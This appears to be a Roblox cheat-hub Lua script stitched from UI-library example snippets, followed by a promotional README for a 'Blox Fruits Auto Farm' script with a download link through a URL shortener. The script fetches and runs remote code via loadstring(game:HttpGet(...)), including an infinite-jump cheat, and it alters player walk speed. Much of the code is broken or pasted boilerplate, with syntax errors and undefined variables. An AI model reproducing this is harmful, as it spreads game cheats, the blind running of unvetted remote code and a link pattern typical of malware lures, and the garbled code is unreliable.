local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/kav"))()
local Window = Library.CreateLib("SHARKI-REI.HUB", "DarkTheme")
local Tab = Window:NewTab("SHARK-REI.HUB")
local Section = Tab:NewSection("Section Name")
Section:NewButton("ButtonText", "ButtonInfo", function()
    print("Clicked")
end)
button:UpdateButton("New Text")
Section:NewToggle("ToggleText", "ToggleInfo", function(state)
    if state then
        print("Toggle On")
    else
        print("Toggle Off")
    end
end)
getgenv().Toggled = false

local toggle = Section:NewToggle("Toggle", "Info", (state)
    getgenv().Toggled = state
end)

game:GetService("RunService").RenderStepped:Connect(function()
	if getgenv().Toggled then
		toggle:UpdateToggle("Toggle On")
	else
		toggle:UpdateToggle("Toggle Off")
	end
end)
Section:NewSlider("SliderText", "SliderInfo", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
end)
Section:NewTextBox("TextboxText", "TextboxInfo", function(txt)
	print(txt)
end)

Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
	print("You just clicked the bind")
end)

Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.F, function()
	Library:ToggleUI()
end)
Section:NewDropdown("DropdownText", "DropdownInf", {"Option 1", "Option 2", "Option 3"}, function(currentOption)
    print(currentOption)
end)

local oldList = {
  "2019",
  "2020"
}
local newList = {
  "2021",
  "2022"
}
local dropdown = Section:NewDropdown("Dropdown","Info", oldList, function()

end)
Section:NewButton("Update Dropdown", "Refreshes Dropdown", function()
  dropdown:Refresh(newList)
end)
Section:NewColorPicker("Color Text", "Color Info", Color3.fromRGB(0,0,0), function(color)
    print(color)
    -- Second argument is the default color
end)

local colors = {
    SchemeColor = Color3.fromRGB(0,255,255),
    Background = Color3.fromRGB(0, 0, 0),
    Header = Color3.fromRGB(0, 0, 0),
    TextColor = Color3.fromRGB(255,255,255),
    ElementColor = Color3.fromRGB(20, 20, 20)
}
local Window = Library.CreateLib("TITLE", colors)
for theme, color in pairs(themes) do
    Section:NewColorPicker(theme, "Change your "..theme, color, function(color3)
        Library:ChangeColor(theme, color3)
    end)
end
-- carregar biblioteca 
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()

-- aviso ao executar
Fluent:Notify({ Title = "executado!", Content = "executando com sucesso" })


local Window = Fluent:CreateWindow({
    Title = "SHARKI-REI.HUB" .. Fluent.Version,
    TabWidth = 160, 
    Size = UDim2.fromOffset(580, 460), 
    Theme = "Dark"
})

local Tabs = {
    Main = Window:AddTab({ Title = "SHARK.P" }),
    Settings = Window:AddTab({ Title = "Settings", Icon = "settings" })
}
-- parágrafos 
Tabs.Main:AddParagraph({ Title = "SHARK", Content = "VERSÃO:1" })

-- botões 
Tabs.Main:AddButton({ Title = "infinite jump", Callback = function() 
loadstring(game:HttpGet("https://raw.githubusercontent.com/HeyGyt/infjump/main/main"))()
end })

-- alterador 
local Toggle = Tabs.Main:AddToggle("autofarm", 
{
    Title = "autofarm", 
    Description = "ele vai diamante",
    Default = false, -- esse "," e preciso coloque em qualquer situação 
    Callback = function(state)
	if state then
	    Fluent:Notify({ Title = "autofarm ligado", Content = "teste" })
	else
	    Fluent:Notify({ Title = "desligando", Content = "desligando" })
        end
    end 
})

--sliders

local Slider = Tabs.Main:AddSlider("pulo", 
{
    Title = "ajusta pulo",
    Description = "irar mudar pulo jogador",
    Default = 2,
    Min = 0,
    Max = 5,
    Rounding = 1,
    Callback = function(Value)
        print("pulo mudou pra:", Value)
    end
})





local Slider = Tabs.Main:AddSlider("velocidade", 
{
    Title = "Velocidade",
    Description = "Ajusta a velocidade do jogador",
    Default = 2,
    Min = 0,
    Max = 5,
    Rounding = 1,
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoid = character:WaitForChild("Humanoid")
        
        -- Define a velocidade de caminhada
        humanoid.WalkSpeed = Value * 10  -- Multiplica o valor para aumentar o impacto
    end
})
# Bloxfruits Autofarm Script

Are you ready to revolutionize your Roblox gaming experience? Say  hello to Auto Farm Level, a game-changing feature that automates the level up process.

**Blox Fruits Auto Farm Level Script - [Download](https://dlgram.com/jgrhn)**

--------------------------------------------------------------------------------------

With Auto Farm Level, you can level up your characters faster. This innovative feature allows you to relax while your character  levels up.
 With Auto Farm Level you can focus on exploring new areas.
 
By automating the farming process, you can make significant progress in your game. This means you can enjoy and focus on what matters.

Upgrade Your Gaming Experience with Auto Farm Level
